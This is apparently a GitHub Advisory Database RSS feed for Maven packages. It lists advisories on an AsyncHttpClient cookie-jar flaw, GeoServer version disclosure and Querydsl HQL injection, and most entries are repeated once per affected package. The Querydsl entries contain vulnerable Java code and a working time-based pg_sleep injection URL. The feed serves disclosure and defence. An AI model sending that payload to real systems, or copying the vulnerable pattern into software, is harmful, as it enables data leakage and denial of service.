<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
    <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
    <updated>2024-12-17T06:01:35.842Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
    <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[org.asynchttpclient:async-http-client] AsyncHttpClient (AHC) library's `CookieStore` replaces explicitly defined `Cookie`s]]></title>
        <id>https://github.com/advisories/GHSA-mfj5-cf8g-g2fv</id>
        <link href="https://github.com/advisories/GHSA-mfj5-cf8g-g2fv"/>
        <updated>2024-12-16T22:51:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When making any HTTP request, the automatically enabled and self-managed <code>CookieStore</code> (aka cookie jar) will silently replace explicitly defined <code>Cookie</code>s with any that have the same name from the cookie jar. For services that operate with multiple users, this can result in one user's <code>Cookie</code> being used for another user's requests.</p>
<h3 id="details">Details</h3>
<p>This issue is described without security warnings here:</p>
<p><a href="https://github.com/AsyncHttpClient/async-http-client/issues/1964">https://github.com/AsyncHttpClient/async-http-client/issues/1964</a></p>
<p>A PR to fix this issue has been made:</p>
<p><a href="https://github.com/AsyncHttpClient/async-http-client/pull/2033">https://github.com/AsyncHttpClient/async-http-client/pull/2033</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Add an auth <code>Cookie</code> to the <code>CookieStore</code><ul>
<li>This is identical to receiving an HTTP response that uses <code>Set-Cookie</code>, as shown in issue #1964 above.</li>
</ul>
</li>
<li>Handle a different user's request where the same <code>Cookie</code> is provided as a passthrough, like a JWT, and attempt to use it by explicitly providing it.</li>
<li>Observe that the user's cookie in step 2 is passed as the Cookie in step 1.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This is generally going to be a problem for developers of backend services that implement third party auth features and use other features like token refresh. The moment a third party service responds by <em>setting</em> a cookie in the response, the <code>CookieStore</code> will effectively break almost every follow-up request (hopefully by being rejected, but possibly by revealing a different user's information).</p>
<p>If your service sets cookies based on the response that happens here, it's possible to lead to even greater levels of exposure.</p>
<h3 id="workaroud">Workaroud</h3>
<p>You can avoid this issue by disabling the <code>CookieStore</code> during client creation:</p>
<pre><code class="language-java">DefaultAsyncHttpClientConfig.Builder clientBuilder = Dsl.config()
 .setCookieStore(null)
 // other configuration
 ;
### References

- &lt;https://github.com/AsyncHttpClient/async-http-client/security/advisories/GHSA-mfj5-cf8g-g2fv&gt;
- &lt;https://nvd.nist.gov/vuln/detail/CVE-2024-53990&gt;
- &lt;https://github.com/AsyncHttpClient/async-http-client/issues/1964&gt;
- &lt;https://github.com/AsyncHttpClient/async-http-client/pull/2033&gt;
- &lt;https://github.com/AsyncHttpClient/async-http-client/commit/d5a83362f7aed81b93ebca559746ac9be0f95425&gt;
- &lt;https://github.com/AsyncHttpClient/async-http-client/blob/main/CHANGES.md#from-20-to-21&gt;
- &lt;https://github.com/advisories/GHSA-mfj5-cf8g-g2fv&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mfj5-cf8g-g2fv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-12-02T20:04:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.asynchttpclient:async-http-client] AsyncHttpClient (AHC) library's `CookieStore` replaces explicitly defined `Cookie`s]]></title>
        <id>https://github.com/advisories/GHSA-mfj5-cf8g-g2fv</id>
        <link href="https://github.com/advisories/GHSA-mfj5-cf8g-g2fv"/>
        <updated>2024-12-16T22:51:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When making any HTTP request, the automatically enabled and self-managed <code>CookieStore</code> (aka cookie jar) will silently replace explicitly defined <code>Cookie</code>s with any that have the same name from the cookie jar. For services that operate with multiple users, this can result in one user's <code>Cookie</code> being used for another user's requests.</p>
<h3 id="details">Details</h3>
<p>This issue is described without security warnings here:</p>
<p><a href="https://github.com/AsyncHttpClient/async-http-client/issues/1964">https://github.com/AsyncHttpClient/async-http-client/issues/1964</a></p>
<p>A PR to fix this issue has been made:</p>
<p><a href="https://github.com/AsyncHttpClient/async-http-client/pull/2033">https://github.com/AsyncHttpClient/async-http-client/pull/2033</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Add an auth <code>Cookie</code> to the <code>CookieStore</code><ul>
<li>This is identical to receiving an HTTP response that uses <code>Set-Cookie</code>, as shown in issue #1964 above.</li>
</ul>
</li>
<li>Handle a different user's request where the same <code>Cookie</code> is provided as a passthrough, like a JWT, and attempt to use it by explicitly providing it.</li>
<li>Observe that the user's cookie in step 2 is passed as the Cookie in step 1.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This is generally going to be a problem for developers of backend services that implement third party auth features and use other features like token refresh. The moment a third party service responds by <em>setting</em> a cookie in the response, the <code>CookieStore</code> will effectively break almost every follow-up request (hopefully by being rejected, but possibly by revealing a different user's information).</p>
<p>If your service sets cookies based on the response that happens here, it's possible to lead to even greater levels of exposure.</p>
<h3 id="workaroud">Workaroud</h3>
<p>You can avoid this issue by disabling the <code>CookieStore</code> during client creation:</p>
<pre><code class="language-java">DefaultAsyncHttpClientConfig.Builder clientBuilder = Dsl.config()
 .setCookieStore(null)
 // other configuration
 ;
### References

- &lt;https://github.com/AsyncHttpClient/async-http-client/security/advisories/GHSA-mfj5-cf8g-g2fv&gt;
- &lt;https://nvd.nist.gov/vuln/detail/CVE-2024-53990&gt;
- &lt;https://github.com/AsyncHttpClient/async-http-client/issues/1964&gt;
- &lt;https://github.com/AsyncHttpClient/async-http-client/pull/2033&gt;
- &lt;https://github.com/AsyncHttpClient/async-http-client/commit/d5a83362f7aed81b93ebca559746ac9be0f95425&gt;
- &lt;https://github.com/AsyncHttpClient/async-http-client/blob/main/CHANGES.md#from-20-to-21&gt;
- &lt;https://github.com/advisories/GHSA-mfj5-cf8g-g2fv&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mfj5-cf8g-g2fv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-12-02T20:04:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.geoserver.web:gs-web-core] Welcome and About GeoServer pages communicate version and revision information]]></title>
        <id>https://github.com/advisories/GHSA-6pfc-w86r-54q6</id>
        <link href="https://github.com/advisories/GHSA-6pfc-w86r-54q6"/>
        <updated>2024-12-16T22:18:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The welcome and about page includes version and revision information about the software in use (including library and components used).</p>
<p>This information is sensitive from a security point of view because it allows software used by the server to be easily identified.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<ol>
<li><p>Welcome page footer: </p>
<img src="https://github.com/geoserver/geoserver/assets/629681/a7fd5151-55d5-432b-9d5d-79136833609f" alt="image" width="432">
</li>
<li><p>About page <em>build information</em>. </p>
<img src="https://github.com/geoserver/geoserver/assets/629681/59fcd8dd-eaee-4bf8-9578-a2a94b2864db" alt="image" width="401"></li>
</ol>
<h3 id="patches">Patches</h3>
<p>No patch presently available.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround available, although the ADMIN_CONSOLE can be disabled completely.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://docs.geoserver.org/latest/en/user/webadmin/about.html">About GeoServer</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6pfc-w86r-54q6">https://github.com/geoserver/geoserver/security/advisories/GHSA-6pfc-w86r-54q6</a></li>
<li><a href="https://github.com/geoserver/geoserver/commit/5fd5f35ae176eff3cc4667a5cf48e4bf5dc4ea99">https://github.com/geoserver/geoserver/commit/5fd5f35ae176eff3cc4667a5cf48e4bf5dc4ea99</a></li>
<li><a href="https://github.com/advisories/GHSA-6pfc-w86r-54q6">https://github.com/advisories/GHSA-6pfc-w86r-54q6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6pfc-w86r-54q6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-16T22:18:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.geoserver.web:gs-web-app] Welcome and About GeoServer pages communicate version and revision information]]></title>
        <id>https://github.com/advisories/GHSA-6pfc-w86r-54q6</id>
        <link href="https://github.com/advisories/GHSA-6pfc-w86r-54q6"/>
        <updated>2024-12-16T22:18:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The welcome and about page includes version and revision information about the software in use (including library and components used).</p>
<p>This information is sensitive from a security point of view because it allows software used by the server to be easily identified.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<ol>
<li><p>Welcome page footer: </p>
<img src="https://github.com/geoserver/geoserver/assets/629681/a7fd5151-55d5-432b-9d5d-79136833609f" alt="image" width="432">
</li>
<li><p>About page <em>build information</em>. </p>
<img src="https://github.com/geoserver/geoserver/assets/629681/59fcd8dd-eaee-4bf8-9578-a2a94b2864db" alt="image" width="401"></li>
</ol>
<h3 id="patches">Patches</h3>
<p>No patch presently available.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround available, although the ADMIN_CONSOLE can be disabled completely.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://docs.geoserver.org/latest/en/user/webadmin/about.html">About GeoServer</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6pfc-w86r-54q6">https://github.com/geoserver/geoserver/security/advisories/GHSA-6pfc-w86r-54q6</a></li>
<li><a href="https://github.com/geoserver/geoserver/commit/5fd5f35ae176eff3cc4667a5cf48e4bf5dc4ea99">https://github.com/geoserver/geoserver/commit/5fd5f35ae176eff3cc4667a5cf48e4bf5dc4ea99</a></li>
<li><a href="https://github.com/advisories/GHSA-6pfc-w86r-54q6">https://github.com/advisories/GHSA-6pfc-w86r-54q6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6pfc-w86r-54q6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-16T22:18:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.querydsl:querydsl-apt] Querydsl vulnerable to HQL injection trough orderBy]]></title>
        <id>https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</id>
        <link href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"/>
        <updated>2024-12-16T21:26:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(<a href="https://github.com/querydsl/querydsl">https://github.com/querydsl/querydsl</a>) where it was assigned preliminary CVE identifier <strong>CVE-2024-49203</strong>.</p>
<h3 id="details">Details</h3>
<p>Vulnerable code may look as follows:</p>
<pre><code>@GetMapping
public List&lt;Test&gt; getProducts(@RequestParam("orderBy") String orderBy) {
    JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);
    PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, "test");

    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
    JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);
    return orderedQuery.fetch();
}
</code></pre>
<p>Where vulnerability is either caused by <code>pathBuilder.get(orderBy)</code> or the <code>orderBy(order)</code> method itself, based on where the security checks are expected.</p>
<h3 id="poc">PoC</h3>
<p>Full POC code is available in repository:
<a href="https://github.com/CSIRTTrizna/CVE-2024-49203/">https://github.com/CSIRTTrizna/CVE-2024-49203/</a>
When we take a look at source code shown in Details section the functionality is as follows:</p>
<ol>
<li>Create JPAQuery object instance:</li>
</ol>
<pre><code>JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);
</code></pre>
<ol start="2">
<li>Create OrderSpecifier object instance:</li>
</ol>
<pre><code>PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, "test");
OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
</code></pre>
<p>Where orderBy variable is user provided input.</p>
<ol start="3">
<li>order and run the query</li>
</ol>
<pre><code>JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);
orderedQuery.fetch();
</code></pre>
<p>When user goes to URL 
<code>/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id</code>
The generated query will look something like this:</p>
<pre><code>select test                                                                                                                                     
from Test test
order by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc
</code></pre>
<h4 id="environment">Environment</h4>
<p>Library versions used in proof of concept to reproduce the vulnerability:</p>
<pre><code>querydsl-jpa: 6.8.0
querydsl-apt: 6.8.0
hibernate-core: 6.1.1.Final
jakarta.persistence-api: 3.1.0
postgresql: 42.7.4
</code></pre>
<h3 id="impact">Impact</h3>
<p>The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg">https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-49203">https://nvd.nist.gov/vuln/detail/CVE-2024-49203</a></li>
<li><a href="https://github.com/querydsl/querydsl/issues/3757">https://github.com/querydsl/querydsl/issues/3757</a></li>
<li><a href="https://github.com/CSIRTTrizna/CVE-2024-49203">https://github.com/CSIRTTrizna/CVE-2024-49203</a></li>
<li><a href="https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0">https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0</a></li>
<li><a href="https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html">https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html</a></li>
<li><a href="https://github.com/OpenFeign/querydsl/releases/tag/5.6.1">https://github.com/OpenFeign/querydsl/releases/tag/5.6.1</a></li>
<li><a href="https://github.com/OpenFeign/querydsl/releases/tag/6.10.1">https://github.com/OpenFeign/querydsl/releases/tag/6.10.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg">https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-27T19:00:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.querydsl:querydsl-jpa] Querydsl vulnerable to HQL injection trough orderBy]]></title>
        <id>https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</id>
        <link href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"/>
        <updated>2024-12-16T21:26:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(<a href="https://github.com/querydsl/querydsl">https://github.com/querydsl/querydsl</a>) where it was assigned preliminary CVE identifier <strong>CVE-2024-49203</strong>.</p>
<h3 id="details">Details</h3>
<p>Vulnerable code may look as follows:</p>
<pre><code>@GetMapping
public List&lt;Test&gt; getProducts(@RequestParam("orderBy") String orderBy) {
    JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);
    PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, "test");

    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
    JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);
    return orderedQuery.fetch();
}
</code></pre>
<p>Where vulnerability is either caused by <code>pathBuilder.get(orderBy)</code> or the <code>orderBy(order)</code> method itself, based on where the security checks are expected.</p>
<h3 id="poc">PoC</h3>
<p>Full POC code is available in repository:
<a href="https://github.com/CSIRTTrizna/CVE-2024-49203/">https://github.com/CSIRTTrizna/CVE-2024-49203/</a>
When we take a look at source code shown in Details section the functionality is as follows:</p>
<ol>
<li>Create JPAQuery object instance:</li>
</ol>
<pre><code>JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);
</code></pre>
<ol start="2">
<li>Create OrderSpecifier object instance:</li>
</ol>
<pre><code>PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, "test");
OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
</code></pre>
<p>Where orderBy variable is user provided input.</p>
<ol start="3">
<li>order and run the query</li>
</ol>
<pre><code>JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);
orderedQuery.fetch();
</code></pre>
<p>When user goes to URL 
<code>/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id</code>
The generated query will look something like this:</p>
<pre><code>select test                                                                                                                                     
from Test test
order by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc
</code></pre>
<h4 id="environment">Environment</h4>
<p>Library versions used in proof of concept to reproduce the vulnerability:</p>
<pre><code>querydsl-jpa: 6.8.0
querydsl-apt: 6.8.0
hibernate-core: 6.1.1.Final
jakarta.persistence-api: 3.1.0
postgresql: 42.7.4
</code></pre>
<h3 id="impact">Impact</h3>
<p>The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg">https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-49203">https://nvd.nist.gov/vuln/detail/CVE-2024-49203</a></li>
<li><a href="https://github.com/querydsl/querydsl/issues/3757">https://github.com/querydsl/querydsl/issues/3757</a></li>
<li><a href="https://github.com/CSIRTTrizna/CVE-2024-49203">https://github.com/CSIRTTrizna/CVE-2024-49203</a></li>
<li><a href="https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0">https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0</a></li>
<li><a href="https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html">https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html</a></li>
<li><a href="https://github.com/OpenFeign/querydsl/releases/tag/5.6.1">https://github.com/OpenFeign/querydsl/releases/tag/5.6.1</a></li>
<li><a href="https://github.com/OpenFeign/querydsl/releases/tag/6.10.1">https://github.com/OpenFeign/querydsl/releases/tag/6.10.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg">https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-27T19:00:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.github.openfeign.querydsl:querydsl-apt] Querydsl vulnerable to HQL injection trough orderBy]]></title>
        <id>https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</id>
        <link href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"/>
        <updated>2024-12-16T21:26:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(<a href="https://github.com/querydsl/querydsl">https://github.com/querydsl/querydsl</a>) where it was assigned preliminary CVE identifier <strong>CVE-2024-49203</strong>.</p>
<h3 id="details">Details</h3>
<p>Vulnerable code may look as follows:</p>
<pre><code>@GetMapping
public List&lt;Test&gt; getProducts(@RequestParam("orderBy") String orderBy) {
    JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);
    PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, "test");

    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
    JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);
    return orderedQuery.fetch();
}
</code></pre>
<p>Where vulnerability is either caused by <code>pathBuilder.get(orderBy)</code> or the <code>orderBy(order)</code> method itself, based on where the security checks are expected.</p>
<h3 id="poc">PoC</h3>
<p>Full POC code is available in repository:
<a href="https://github.com/CSIRTTrizna/CVE-2024-49203/">https://github.com/CSIRTTrizna/CVE-2024-49203/</a>
When we take a look at source code shown in Details section the functionality is as follows:</p>
<ol>
<li>Create JPAQuery object instance:</li>
</ol>
<pre><code>JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);
</code></pre>
<ol start="2">
<li>Create OrderSpecifier object instance:</li>
</ol>
<pre><code>PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, "test");
OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
</code></pre>
<p>Where orderBy variable is user provided input.</p>
<ol start="3">
<li>order and run the query</li>
</ol>
<pre><code>JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);
orderedQuery.fetch();
</code></pre>
<p>When user goes to URL 
<code>/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id</code>
The generated query will look something like this:</p>
<pre><code>select test                                                                                                                                     
from Test test
order by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc
</code></pre>
<h4 id="environment">Environment</h4>
<p>Library versions used in proof of concept to reproduce the vulnerability:</p>
<pre><code>querydsl-jpa: 6.8.0
querydsl-apt: 6.8.0
hibernate-core: 6.1.1.Final
jakarta.persistence-api: 3.1.0
postgresql: 42.7.4
</code></pre>
<h3 id="impact">Impact</h3>
<p>The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg">https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-49203">https://nvd.nist.gov/vuln/detail/CVE-2024-49203</a></li>
<li><a href="https://github.com/querydsl/querydsl/issues/3757">https://github.com/querydsl/querydsl/issues/3757</a></li>
<li><a href="https://github.com/CSIRTTrizna/CVE-2024-49203">https://github.com/CSIRTTrizna/CVE-2024-49203</a></li>
<li><a href="https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0">https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0</a></li>
<li><a href="https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html">https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html</a></li>
<li><a href="https://github.com/OpenFeign/querydsl/releases/tag/5.6.1">https://github.com/OpenFeign/querydsl/releases/tag/5.6.1</a></li>
<li><a href="https://github.com/OpenFeign/querydsl/releases/tag/6.10.1">https://github.com/OpenFeign/querydsl/releases/tag/6.10.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg">https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-27T19:00:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.github.openfeign.querydsl:querydsl-jpa] Querydsl vulnerable to HQL injection trough orderBy]]></title>
        <id>https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</id>
        <link href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"/>
        <updated>2024-12-16T21:26:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(<a href="https://github.com/querydsl/querydsl">https://github.com/querydsl/querydsl</a>) where it was assigned preliminary CVE identifier <strong>CVE-2024-49203</strong>.</p>
<h3 id="details">Details</h3>
<p>Vulnerable code may look as follows:</p>
<pre><code>@GetMapping
public List&lt;Test&gt; getProducts(@RequestParam("orderBy") String orderBy) {
    JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);
    PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, "test");

    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
    JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);
    return orderedQuery.fetch();
}
</code></pre>
<p>Where vulnerability is either caused by <code>pathBuilder.get(orderBy)</code> or the <code>orderBy(order)</code> method itself, based on where the security checks are expected.</p>
<h3 id="poc">PoC</h3>
<p>Full POC code is available in repository:
<a href="https://github.com/CSIRTTrizna/CVE-2024-49203/">https://github.com/CSIRTTrizna/CVE-2024-49203/</a>
When we take a look at source code shown in Details section the functionality is as follows:</p>
<ol>
<li>Create JPAQuery object instance:</li>
</ol>
<pre><code>JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);
</code></pre>
<ol start="2">
<li>Create OrderSpecifier object instance:</li>
</ol>
<pre><code>PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, "test");
OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
</code></pre>
<p>Where orderBy variable is user provided input.</p>
<ol start="3">
<li>order and run the query</li>
</ol>
<pre><code>JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);
orderedQuery.fetch();
</code></pre>
<p>When user goes to URL 
<code>/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id</code>
The generated query will look something like this:</p>
<pre><code>select test                                                                                                                                     
from Test test
order by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc
</code></pre>
<h4 id="environment">Environment</h4>
<p>Library versions used in proof of concept to reproduce the vulnerability:</p>
<pre><code>querydsl-jpa: 6.8.0
querydsl-apt: 6.8.0
hibernate-core: 6.1.1.Final
jakarta.persistence-api: 3.1.0
postgresql: 42.7.4
</code></pre>
<h3 id="impact">Impact</h3>
<p>The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg">https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-49203">https://nvd.nist.gov/vuln/detail/CVE-2024-49203</a></li>
<li><a href="https://github.com/querydsl/querydsl/issues/3757">https://github.com/querydsl/querydsl/issues/3757</a></li>
<li><a href="https://github.com/CSIRTTrizna/CVE-2024-49203">https://github.com/CSIRTTrizna/CVE-2024-49203</a></li>
<li><a href="https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0">https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0</a></li>
<li><a href="https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html">https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html</a></li>
<li><a href="https://github.com/OpenFeign/querydsl/releases/tag/5.6.1">https://github.com/OpenFeign/querydsl/releases/tag/5.6.1</a></li>
<li><a href="https://github.com/OpenFeign/querydsl/releases/tag/6.10.1">https://github.com/OpenFeign/querydsl/releases/tag/6.10.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg">https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</uri>
        </author>
        <category label="severity" term="HIGH"/>
